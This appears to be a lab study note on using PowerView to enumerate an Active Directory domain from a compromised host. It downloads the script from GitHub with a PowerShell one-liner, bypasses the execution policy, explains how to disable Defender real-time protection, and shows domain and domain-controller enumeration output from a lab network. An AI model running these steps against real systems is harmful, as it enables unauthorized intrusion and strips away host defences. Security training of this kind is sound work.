#PowerView 
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1


PowerView is ran internally from a compromised Domain joined host:\
- drag over from desktop to rdp session on Domain joined host
- Or from Domain joined host PowerShell

```
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```


Then set Execution Policy to allow script to run:
- From PowerShell
```Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser```
- From cmd line
```powershell -ep bypass```

Run PowerView.ps1
`Import-Module .\PowerView.ps1`

May need to Temporarily Disable Antivirus

Open Windows Security:

Press Win + I to open Settings, then navigate to Update & Security > Windows Security.
Click on Virus & threat protection.
Manage Settings:

Under Virus & threat protection settings, click on Manage settings.
Disable Real-time Protection:

Turn off Real-time protection.

```
PS C:\Users\fcastle\Desktop> C:\Users\fcastle\Desktop\PowerView.ps1

PS C:\Users\fcastle\Desktop> Import-Module .\PowerView.ps1
Import-Module .\PowerView.ps1

PS C:\Users\fcastle\Desktop> Get-NetDomain


Forest                  : MARVEL.local
DomainControllers       : {HYDRA-DC.MARVEL.local}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : HYDRA-DC.MARVEL.local
RidRoleOwner            : HYDRA-DC.MARVEL.local
InfrastructureRoleOwner : HYDRA-DC.MARVEL.local
Name                    : MARVEL.local

PS C:\Users\fcastle\Desktop> Get-NetDomainController


Forest                     : MARVEL.local
CurrentTime                : 7/3/2024 6:09:20 PM
HighestCommittedUsn        : 32849
OSVersion                  : Windows Server 2022 Standard Evaluation
Roles                      : {SchemaRole, NamingRole, PdcRole, RidRole...}
Domain                     : MARVEL.local
IPAddress                  : 192.168.95.132
SiteName                   : Default-First-Site-Name
SyncFromAllServersCallback : 
InboundConnections         : {}
OutboundConnections        : {}
Name                       : HYDRA-DC.MARVEL.local
Partitions                 : {DC=MARVEL,DC=local, 
                             CN=Configuration,DC=MARVEL,DC=local, 
                             CN=Schema,CN=Configuration,DC=MARVEL,DC=local, 
                             DC=DomainDnsZones,DC=MARVEL,DC=local...}
```

many more PowerView commands:
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
